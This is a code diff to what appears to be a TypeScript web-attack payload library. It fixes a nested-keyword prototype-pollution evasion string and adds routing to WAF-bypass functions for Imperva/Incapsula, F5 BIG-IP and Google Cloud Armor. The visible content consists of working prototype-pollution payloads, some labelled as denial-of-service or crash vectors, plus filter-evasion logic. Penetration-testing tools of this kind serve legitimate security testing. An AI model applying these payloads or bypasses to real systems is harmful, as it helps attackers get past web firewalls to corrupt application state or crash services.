@@ -447,7 +447,7 @@ export const ADVANCED_PAYLOADS: Record<string, PayloadCategory> = {
 			// Nested keyword evasion
 			'__pro__proto__to__[polluted]=true',
 			'__pro__proto__to__.polluted=true',
-			'constconstrucructor[proto__proto__type][polluted]=true',
+			'constconstructorructor[proto__proto__type][polluted]=true',
 
 			// built-in method overrides (DoS / Crash vectors)
 			'__proto__.toString=1',
@@ -523,6 +523,18 @@ export function generateWAFSpecificPayloads(wafType: string, basePayload: string
 		case 'sophos waf':
 		case 'sophos utm':
 			return WAFBypasses.sophosBypass(basePayload);
+		case 'imperva':
+		case 'incapsula':
+			return WAFBypasses.impervaBypass(basePayload);
+		case 'f5':
+		case 'f5 big-ip':
+		case 'f5 big ip':
+			return WAFBypasses.f5BigIpBypass(basePayload);
+		case 'google':
+		case 'google cloud armor':
+		case 'cloud armor':
+		case 'gcp':
+			return WAFBypasses.googleCloudArmorBypass(basePayload);
 		default:
 			return PayloadEncoder.generateBypassVariations(basePayload);
 	}
